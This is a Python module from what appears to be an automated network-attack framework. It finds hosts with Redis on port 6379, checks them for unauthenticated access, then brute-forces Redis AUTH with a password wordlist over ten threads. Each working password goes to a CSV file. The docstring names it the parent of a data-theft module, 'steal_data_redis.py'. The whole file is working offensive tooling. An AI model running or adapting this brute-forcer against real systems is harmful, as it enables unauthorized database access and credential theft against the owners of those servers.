"""
redis_connector.py - Brute forces Redis (port 6379) authentication using RESP inline
protocol over raw TCP. Always tries unauthenticated access first since Redis instances
are commonly left open. Parent for steal_data_redis.py.
"""

import os
import csv
import socket
import threading
import logging
import time
import pandas as pd
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

logger = Logger(name="redis_connector.py", level=logging.DEBUG)

b_class = "RedisBruteforce"
b_module = "redis_connector"
b_status = "brute_force_redis"
b_port = 6379
b_parent = None


def _redis_cmd(sock, command):
    """Send an inline RESP command and return the first line of the response."""
    sock.sendall((command + "\r\n").encode())
    try:
        return sock.recv(256).decode('utf-8', errors='replace').strip()
    except socket.timeout:
        return ""


class RedisBruteforce:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.redis_connector = RedisConnector(shared_data)
        logger.info("RedisConnector initialized.")

    def bruteforce_redis(self, ip, port):
        return self.redis_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        logger.info(f"Executing RedisBruteforce on {ip}:{port}...")
        existing_creds = CredentialChecker.check_existing_credentials(
            self.shared_data.redisfile, ip
        )
        if existing_creds:
            if self._verify_credentials(ip, existing_creds):
                logger.success(f"Existing Redis credentials verified for {ip}")
                return 'success'
            logger.warning(f"Existing Redis credentials for {ip} no longer valid, re-bruteforcing")

        self.shared_data.ragnarorch_status = "RedisBruteforce"
        time.sleep(2)
        success, results = self.redis_connector.run_bruteforce(ip, port)
        return 'success' if success else 'failed'

    def _verify_credentials(self, ip, credentials):
        for _, password in credentials:
            if self.redis_connector.redis_connect(ip, password):
                return True
        return False


class RedisConnector:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()
        self.redisfile = shared_data.redisfile
        if not os.path.exists(self.redisfile):
            with open(self.redisfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []
        self.lock = threading.Lock()
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        try:
            data = self.shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
        except Exception as e:
            logger.warning(f"Could not read scan data: {e}")
            self.scan = pd.DataFrame(columns=['MAC Address', 'IPs', 'Hostnames', 'Ports', 'Alive'])
        self.scan["Ports"] = self.scan["Ports"].astype(str)
        self.scan = self.scan[self.scan["Ports"].str.contains("6379", na=False)]

    def redis_connect(self, ip, password="", port=6379):
        """
        Attempt Redis authentication. Empty password tests unauthenticated access.
        Returns True on success.
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((ip, port))

            if not password:
                response = _redis_cmd(sock, "PING")
                return "+PONG" in response
            else:
                response = _redis_cmd(sock, f"AUTH {password}")
                return "+OK" in response

        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        except Exception as e:
            logger.debug(f"Redis connect error for {ip}: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def worker(self, progress, task_id, success_flag):
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                break
            ip, password, mac, hostname, port = self.queue.get()
            if self.redis_connect(ip, password, port):
                with self.lock:
                    self.results.append([mac, ip, hostname, "", password, port])
                    display_pw = "(no auth)" if not password else f"'{password}'"
                    logger.success(f"Redis access confirmed on {ip}:{port} {display_pw}")
                    self.save_results()
                    self.remove_duplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()
        try:
            mac = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
            hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
        except IndexError:
            mac, hostname = "unknown", "unknown"

        # Try unauthenticated first, then wordlist
        passwords = [""] + open(self.shared_data.passwordsfile, "r").read().splitlines()
        for pw in passwords:
            if self.shared_data.orchestrator_should_exit:
                return False, []
            self.queue.put((adresse_ip, pw, mac, hostname, port))

        success_flag = [False]
        threads = []
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing Redis...", total=len(passwords))
            for _ in range(10):
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)
            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break
            self.queue.join()
            for t in threads:
                t.join()

        return success_flag[0], self.results

    def save_results(self):
        with open(self.redisfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []

    def remove_duplicates(self):
        df = pd.read_csv(self.redisfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.redisfile, index=False)


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        redis_bf = RedisBruteforce(shared_data)
        logger.info("Starting Redis brute force on port 6379")
        for row in shared_data.read_data():
            ip = row["IPs"]
            redis_bf.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")
